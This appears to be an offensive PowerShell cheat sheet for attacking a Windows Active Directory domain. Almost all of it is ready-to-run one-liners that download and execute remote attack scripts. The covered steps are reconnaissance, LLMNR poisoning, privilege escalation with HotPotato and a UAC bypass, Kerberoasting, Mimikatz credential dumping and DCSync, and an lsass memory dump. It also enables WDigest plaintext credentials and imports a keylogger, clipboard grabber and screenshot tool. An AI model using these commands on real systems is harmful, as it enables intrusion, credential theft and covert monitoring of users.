# Author: viszsec https://github.com/viszsec

# Runas Admin
powershell.exe Start-Process powershell -Verb runAs

# find smbhost
powershell.exe nmap -vv -Pn -n -p 445 192.168.10.0/24 -oA smb_host

# Find policies domain
powershell.exe findstr /S /I cpassword \\TEST-LAB\sysvol\TEST-LAB\policies\*.xml

# NetScan
powershell.exe C:\Users\labtest\Desktop\lazagne.exe\NetScan.exe 192.168.10.1-192.168.10.254

# Target Discovery - Lateral Movement
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JavelinNetworks/HoneypotBuster/master/Invoke-HoneypotBuster.ps1');Invoke-HoneypotBuster"

# Lazagne
powershell.exe C:\Users\labtest\Desktop\lazagne.exe\lazagne.exe

# ASREP Roasting
powershell.exe C:\Users\labtest\Desktop\lazagne.exe\Rubeus.exe

# Domain Recon
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

## Import PowerView Module Kerberoasting and Local
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"

## Invoke-BloodHound for domain recon
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

## ADRecon script to generate XLSX file of domain properties
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"

## LLMNR poisoning
powershell.exe -exec Bypass -noexit -C "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y

# Priv Esc
## PowerUp script
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

## cPasswords in sysvol
findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S cpassword $env:logonserver\sysvol\*.xml

## Inveigh
### Start inveigh using Basic Auth - logging to file
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"

### Start inveigh in silent mode (no popups)
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"

## Invoke-HotPotato Exploit
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"

## Bypass UAC and launch PowerShell window as admin
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

## Invoke-Kerberoast with Hashcat Output
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"


# Reg Keys
## Enable Wdigest
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f

## Check always install elevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer


# Mimikatz
## Invoke Mimikatz
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

## Import Mimikatz Module
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

## Perform DcSync attack
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'

## Invoke-MassMimikatz
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# Useful Scripts/Commands
## Use Windows Debug api to pause live processes
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"

## Import Powersploits invoke-keystrokes
## Manual Procdump mimikatz
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"

## Import Empire's Get-ClipboardContents
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"

## Import Get-TimedScreenshot
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"
